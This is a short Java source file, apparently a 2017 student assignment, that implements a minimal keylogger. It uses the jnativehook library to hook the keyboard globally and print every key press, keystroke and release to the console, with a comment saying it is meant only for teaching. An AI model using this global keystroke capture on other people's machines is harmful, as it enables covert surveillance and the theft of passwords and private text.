/*
 * Jimmy Tran
 * Bourgeois
 * CSC 4222
 * 9 October 2017
 *
 * This program will not be used for any malicious activity.
 * It's only purpose is as an educational tool.
*/
package jtran25a2;
//imports for the jnativehook library
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/* Not sure how much original code you expect. It's near impossible to write
 * this code in a unique manner without adding arbitrary garbage. Plus,
 * each of NativeKeyListener's methods have to overwritten to actually use the
 * library in the first place, so nothing can be ignored or left out.
*/
//main class
public class Keylogger implements NativeKeyListener {
    //tracks and prints which keys are pressed. Also includes an escape try-catch.
    public void nativeKeyPressed(NativeKeyEvent e) {
	System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }
    
    //prints out typed keys
    public void nativeKeyTyped(NativeKeyEvent e) {
	System.out.println("Typed: " + e.getKeyText(e.getKeyCode()));
    }
    
    //prints out if a key is released
    public void nativeKeyReleased(NativeKeyEvent e) {
	System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    //main method
    public static void main(String[] args) {
        //try-catch in case the hook fails or something
	try {
            GlobalScreen.registerNativeHook();
	}
	catch (NativeHookException ex) {
            System.err.println("Hook failed to register.");
            System.exit(1);
	}
	GlobalScreen.addNativeKeyListener(new Keylogger());
    }
}